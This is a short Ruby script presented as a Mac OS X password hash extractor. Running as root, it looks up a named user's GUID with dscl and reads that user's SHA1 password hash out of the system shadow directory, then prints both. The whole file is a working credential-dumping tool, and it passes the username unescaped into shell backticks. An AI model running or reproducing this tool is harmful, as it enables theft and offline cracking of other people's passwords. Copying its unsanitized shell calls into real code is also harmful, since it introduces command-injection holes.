#!/usr/bin/env ruby
#
# extracts an osx users uuid and hash
# *root is needed to access shadow

def banner
  puts "\n\tmac osx hash extractor"
  puts "\tusage: ./hash.rb <username>"
  puts "\t  must run as root user\n"
end

def make_output(guid, hash, user)
  puts "\n\n"
  puts "Username:\t#{user}"
  puts "GUID:\t\t#{guid}"
  puts "Hash:\t\t#{hash}"
  puts "\n\n"
end

def get_guid(user_name)
  puts "[~] extracting UID for user #{user_name}..."
  user_guid = `dscl localhost -read /Search/Users/#{user_name} | grep GeneratedUID | cut -c15-`.split("\n")[0]
  puts "[~] retrieving SHA1 hash..."
  user_hash = `cat /var/db/shadow/hash/#{user_guid} | cut -c169-216`.chomp!
  if user_hash.include?("denied")
    puts "[!] failed to read hash: improper permissions"
    exit(1)
  elsif user_hash == ""
    puts "[!] failed to read hash: unknown error"
    exit(1)
  end
  make_output(user_guid, user_hash, user_name)
end

if ARGV[0] != nil and Process.uid == 0
  get_guid(ARGV[0])
else
  banner
end



